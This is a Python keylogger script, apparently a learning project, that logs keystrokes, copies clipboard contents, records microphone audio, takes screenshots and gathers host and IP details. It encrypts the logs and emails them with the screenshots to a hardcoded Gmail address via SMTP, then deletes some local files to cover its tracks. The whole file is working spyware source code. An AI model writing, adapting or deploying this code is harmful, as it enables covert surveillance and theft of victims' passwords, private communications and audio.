## Library Imports
# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# System Info
import socket
import platform
from email.quoprimime import body_check
from idlelib.outwin import file_line_pats
from tkinter import image_types

# Clipboard
import win32clipboard
from cryptography.x509 import IPAddress

# Keys and Listener
from pynput.keyboard import Key, Listener

import time
import os
from dotenv import load_dotenv

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from six import with_metaclass

keys_information = "keys_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted - easy names here for learning purpose
keys_information_e = "e_keys_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 5
number_of_iterations_end = 3

with open("D:\\My GitHub\\rachit404\\python_keylogger\\Cryptography\\encryption_key.txt", 'rb') as f:
    key = f.read()

file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"
with open(file_path + keys_information, 'w') as f:
    f.write("")

load_dotenv()
fromaddr = os.getenv("EMAIL_SENDER")
password = os.getenv("GMAIL_SMTP_PASSWORD")
# print("Password: ",password)
toaddr = "tempmail8user@gmail.com"

def send_mail(filename, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body Of The Mail"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
# send_mail(keys_information, file_path+keys_information, toaddr)

def computer_information():
    with open(file_path+system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: "+public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("\nProcessor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddress + "\n")
computer_information()

def copy_clipboard():
    with open(file_path + clipboard_information, "a" ) as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")
copy_clipboard()

def microphone():
    sampling_feq = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds*sampling_feq), samplerate=sampling_feq, channels=2)
    sd.wait()

    write(file_path+audio_information, sampling_feq, myrecording)
microphone()

def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + screenshot_information)
screenshot()

number_of_iterations = 0
currentTime = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                # else:  # Key.ctrl_lKey.alt_l
                elif k.find("Key") == -1:
                    f.write(k)
                f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopping_time:
            return False
        return None


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stopping_time:
        # with open(file_path + keys_information, "w") as f:
        #     f.write(" ")

        screenshot()
        send_mail(screenshot_information, file_path+screenshot_information, toaddr )

        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stopping_time = time.time() + time_iteration

files_to_encrypt = [file_path + system_information,
                    file_path + clipboard_information,
                    file_path + keys_information]
encrypted_file_names = [file_path + system_information_e,
                        file_path + clipboard_information_e,
                        file_path + keys_information_e]
count = 0
for _ in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted_data)

    send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(60)

# Clean up tracks and delete files
delete_files = [system_information,
                clipboard_information]
for file in delete_files:
    os.remove(file_path + file)















